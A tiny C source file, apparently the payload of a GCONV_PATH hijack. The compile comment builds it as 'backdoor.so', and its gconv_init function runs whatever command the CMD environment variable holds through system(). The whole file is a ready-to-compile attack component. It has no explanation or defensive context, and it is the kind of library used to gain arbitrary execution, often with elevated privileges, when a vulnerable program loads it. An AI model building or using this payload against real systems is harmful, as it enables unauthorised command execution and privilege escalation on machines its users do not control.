// gcc -shared -fPIC -O2 so.c -o backdoor.so
#include <stdio.h>
#include <stdlib.h>
void gconv() {}
void gconv_init() {
    system(getenv("CMD"));
}
